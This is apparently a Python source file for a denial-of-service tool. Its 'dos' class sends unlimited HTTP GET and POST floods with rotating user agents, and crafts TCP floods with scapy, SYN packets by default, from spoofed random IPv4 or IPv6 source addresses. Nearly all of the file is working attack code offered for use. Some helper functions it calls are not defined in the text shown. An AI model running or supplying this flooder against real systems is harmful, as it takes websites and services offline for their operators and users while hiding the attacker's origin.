import requests
import socket
import random
import helper_functions
import sys
import signal
import scapy.all as scapy
from time import sleep, time
from colorama import Fore, init
class dos:
    def __init__(self, host: str, wait: int=0, method: str="get", packet_count: int = 0, get_user_agent: bool = False, custom_header: bool = False, get_changing_agent_auto: bool = False, payload: bool = False):
        self.TARGET = host
        self.WAIT = wait
        self.METHOD = method.lower()
        self.headers = {}
        self.body = {}
        self.GET_USER_AGENT = get_user_agent
        self.CUSTOM_HEADER = custom_header
        self.GET_AUTO_CHANGING_USER_AGENT = get_changing_agent_auto
        self.PACKET_COUNT = packet_count
        self.PAYLOAD = payload        
        # Signal handling for graceful exit
        signal.signal(signal.SIGINT, self.handle_interrupt)
        self.should_exit = False  # Flag to indicate if the process should exit
    def handle_interrupt(self, signal_num, frame):
        self.should_exit = True  # Set the exit flag when interrupted
    def get_random_user_agent(self):
        user_agent_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
            "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
        ]
        return {"User -Agent": random.choice(user_agent_list)}  # Returns a random user agent from the list
    def start(self):
        try:
            init(autoreset=True)
            if self.METHOD == "tcp":  # Checks the method if TCP start TCP handler
                self.tcp_flood_handler()
            else:
                if self.GET_USER_AGENT: 
                    self.headers.update(self.get_random_user_agent())  # Get a random user agent if asked for

                if self.CUSTOM_HEADER:
                    self.get_custom_header()  # Gets header input handler if asked for
                    
                if self.PAYLOAD:
                    self.get_payload()  # Gets payload input handler if asked for

                if self.PACKET_COUNT > 0:
                    for _ in range(self.PACKET_COUNT):  # Repeats payload as much as the given time
                        if self.METHOD == "get":
                            self.get_flood()  # Starts GET DOS
                        elif self.METHOD == "post":
                            self.post_flood()  # Starts POST DOS
                        sleep(self.WAIT)  # Waits the given time in s
                        if self.should_exit:  # Check if exit flag is set
                            break
                else:
                    while not self.should_exit:  # unlimited loop till keyboard interruption 
                        if self.METHOD == "get":
                            self.get_flood()
                        elif self.METHOD == "post":
                            self.post_flood()
                        sleep(self.WAIT)
        except Exception as e:
            print(f"[{Fore.RED}ERROR{Fore.RESET}] {str(e)}")  # Print the error message
            sys.exit(0)
    # Handles header input and saves it in header variable
    def get_custom_header(self):
        print(f"{Fore.GREEN}HEADER")
        print(f"[{Fore.BLUE}INFO{Fore.RESET}] Type 'done' and enter if done. Type key:value enter format [for custom header input]")
        if self.GET_AUTO_CHANGING_USER_AGENT:
            print(f"User -Agent : RANDOM")
        elif self.GET_USER_AGENT:
            print(f"User -Agent : {self.headers.get('User -Agent')}")
        while True:
            try:
                user_input = input(">")
                if user_input.lower() == "done":  # Check if input is done and if enter exit header handler
                    break
                if ":" in user_input:  # Checks for valid input
                    key, value = user_input.split(":", 1)
                    self.headers.update({key.strip(): value.strip()})
                else:  # Shows info when format of the header is not correct key:value
                    print(f"[{Fore.RED}ERROR{Fore.RESET}] Invalid format. Use key:value")
            except:  # Raises exception if invalid input
                print(f"[{Fore.RED}ERROR{Fore.RESET}] Invalid input given")
        helper_functions.console_handler().clear()
        print("-" * 6)
        print(f"{Fore.GREEN}HEADER")
        print("-" * 6)
        for key, value in self.headers.items(): 
            print(f"{Fore.YELLOW}{key}{Fore.RESET} : {Fore.BLUE}{value}")  # Shows all header items in a formatted way
    # Handles payload input
    def get_payload(self):
        print(f"{Fore.GREEN}PAYLOAD")
        print(f"[{Fore.BLUE}INFO{Fore.RESET}] Type 'done' and enter if done. Type key:value enter format [for custom payload/param input]")
        while True:
            try:
                user_input = input(">")
                if user_input.lower() == "done":
                    break
                if ":" in user_input:
                    key, value = user_input.split(":", 1)
                    self.body.update({key.strip(): value.strip()})
                else:
                    print(f"[{Fore.RED}ERROR{Fore.RESET}] Invalid format. Use key:value")
            except:
                print(f"[{Fore.RED}ERROR{Fore.RESET}] Invalid input given")
        helper_functions.console_handler().clear()
        print("-" * 6)
        print(f"{Fore.GREEN}PAYLOAD")
        print("-" * 6)
        for key, value in self.body.items():
            print(f"{Fore.YELLOW}{key}{Fore.RESET} : {Fore.BLUE}{value}")
    def get_flood(self):
        try:
            start = time()  # Gets start time
            if not self.PAYLOAD:  # Check if payload is empty of so don't use payload if not use payload 
                requests.get(self.TARGET, headers=self.headers)  # Sends get request with the given data
            else:
                requests.get(self.TARGET, headers=self.headers, params=self.body)
            end = time()  # Gets end time
            if self.GET_AUTO_CHANGING_USER_AGENT:
                self.headers.update(self.get_random_user_agent())
            print(f"[{Fore.GREEN}+{Fore.RESET}] Sending GET request to {self.TARGET} -> {end - start:.3f}s")  # Give a bit info about the request
        except:
            print(f"[{Fore.RED}FAILED{Fore.RESET}] Sending GET request to {self.TARGET}")  # Give info when sending fails
    def post_flood(self):
        try:
            start = time()
            if not self.PAYLOAD:
                requests.post(self.TARGET, headers=self.headers)  # Sends POST request using the given data
            else:
                requests.post(self.TARGET, headers=self.headers, data=self.body)
            end = time()
            if self.GET_AUTO_CHANGING_USER_AGENT:
                self.headers.update(self.get_random_user_agent())
            
            print(f"[{Fore.GREEN}+{Fore.RESET}] Sending POST request to {self.TARGET} -> {end - start:.3f}s")
        except:
            print(f"[{Fore.RED}FAILED{Fore.RESET}] Sending POST request to {self.TARGET}")
    def tcp_flood_handler(self):
        flag_list = [
            {"Flag": "S", "Name": "SYN", "Description": "Synchronization"},
            {"Flag": "A", "Name": "ACK", "Description": "Acknowledge"},
            {"Flag": "F", "Name": "FIN", "Description": "Finish"},
            {"Flag": "R", "Name": "RST", "Description": "Reset"},
            {"Flag": "P", "Name": "PSH", "Description": "Push"},
            {"Flag": "U", "Name": "URG", "Description": "Urgent"}
        ]
        flag = "S"
        ip = helper_functions.device_info().get_IP()
        random_ip_version = 4
        random_source_ip = True
        target_port = 80
        data = None
        helper_functions.console_handler().banner("TCP FLOOD")  # Basic banner 
        for menu_item in flag_list:
            print(f"{menu_item['Flag']} | {menu_item['Name']} | {menu_item['Description']}")  # Showing menu items in formatted way
        user_input = input(f"[{Fore.YELLOW}INPUT{Fore.RESET}] Flag default => SYN> ").strip()  # Get user input for TCP packet type if not legitimate use None
        flag_dict = next((f for f in flag_list if f["Flag"].lower() == user_input.lower() or
                          f["Name"].lower() == user_input.lower() or
                          f["Description"].lower() == user_input.lower()), None)
        if flag_dict:
            flag = flag_dict["Flag"]  # If input correct change flag
        else:
            flag_dict = next((f for f in flag_list if f["Flag"].lower() == flag.lower()), None)  # If not correct save the correct menu item data 
            print(f"[{Fore.GREEN}INFO{Fore.RESET}] No valid flag given, using default: {flag}")  # Give info if the flag is correct
        user_input = input(f"[{Fore.YELLOW}INPUT{Fore.RESET}] Want to spoof source IP (y/n) default => y> ").strip().lower()  # Get input to know if to spoof IP
        if user_input != "n":
            user_input = input(f"[{Fore.YELLOW}INPUT{Fore.RESET}] Set custom IP or random each time? (c/r) default => r> ").strip().lower()  # Ask to automatically spoof or not
            if user_input != "c":
                user_input = input(f"[{Fore.YELLOW}INPUT{Fore.RESET}] Random IPv4 or IPv6? (4/6) default => 4> ").strip()  # If automatically spoof ask for IP version
                if user_input == "6":
                    random_ip_version = 6  # Change ip version accordingly if needed to random IPv6
                    ip = self.generate_ipv6()  # Generate and save the generated random IPv6
                else:
                    ip = self.generate_ipv4()  # Generate and save the random IPv4 if version is 4
            else:
                random_source_ip = False  # I doesn't want random IP set to false
                while True:
                    custom_ip = input(f"[{Fore.YELLOW}INPUT{Fore.RESET}] Source IP default => {ip}> ").strip()  # Ask custom source IP 
                    if not custom_ip:
                        break
                    if helper_functions.is_valid_IP(custom_ip):  # Check validity of the given IP
                        ip = custom_ip  # If valid change ip to the custom 1
                        break
                    else:
                        print(f"[{Fore.RED}ERROR{Fore.RESET}] Invalid IP: {custom_ip}")  # Invalid give INFO for him to change
        else:
            random_source_ip = False
        user_input = input(f"[{Fore.YELLOW}INPUT{Fore.RESET}] Target port default => {target_port}> ").strip()  # Ask user for a port number
        if user_input.isdigit():
            target_port = int(user_input)  # If the given input is a digit change the target port 
        else:
            print(f"[{Fore.YELLOW}INFO{Fore.RESET}] Using default port: {target_port}")  # If not give info that it isn't changed
        user_input = input(f"[{Fore.YELLOW}INPUT{Fore.RESET}] Add payload? (y/n) default => n> ").strip().lower()  # Ask if the user wants to send raw bytes in the custom tcp packet
        if user_input == "y":
            data_input = input(f"[{Fore.YELLOW}INPUT{Fore.RESET}] Payload> ").strip()  # If yes ask for input to send
            data = data_input.encode() if data_input else None
        try:
            if self.PACKET_COUNT > 0:
                for _ in range(self.PACKET_COUNT):
                    source_ip = self.generate_ipv6() if random_source_ip and random_ip_version == 6 else (
                        self.generate_ipv4() if random_source_ip else ip)  # Check if random IP is set true and change accordingly with the give, version
                    self.tcp_flood(flag, source_ip, target_port, flag_dict["Name"], data)  # DOS using TCP
                    sleep(self.WAIT)
                    if self.should_exit:  # Check if exit flag is set
                        break
            else:
                while not self.should_exit:
                    source_ip = self.generate_ipv6() if random_source_ip and random_ip_version == 6 else (
                        self.generate_ipv4() if random_source_ip else ip)
                    self.tcp_flood(flag, source_ip, target_port, flag_dict["Name"], data)
                    sleep(self.WAIT)
        except KeyboardInterrupt:
            print(f"[{Fore.RED}!{Fore.RESET}] User interruption")  # Give Info about interruption
    def tcp_flood(self, flag: str, source_ip: str, target_port: int, packet_type: str, payload: bytes = None):
        try:
            ip_layer = scapy.IP(src=source_ip, dst=self.TARGET)  # Makes the IP layer of the packet 
            tcp_layer = scapy.TCP(dport=target_port, flags=flag)  # Makes the TCP layer of the packet
            packet = ip_layer / tcp_layer / scapy.Raw(load=payload) if payload else ip_layer / tcp_layer  # Check if a payload is given if not don't send a payload
            start = time() 
            scapy.send(packet, verbose=False)  # Send made packet without verbose
            end = time()
            print(f"[{Fore.GREEN}+{Fore.RESET}] Sending {packet_type} to {self.TARGET} as {source_ip} -> {end - start:.3f}s")  # Give info about the sent packet
        except:
            print(f"[{Fore.RED}FAILED{Fore.RESET}] Sending {packet_type} to {self.TARGET} as {source_ip}")  # Give info about the sent packet
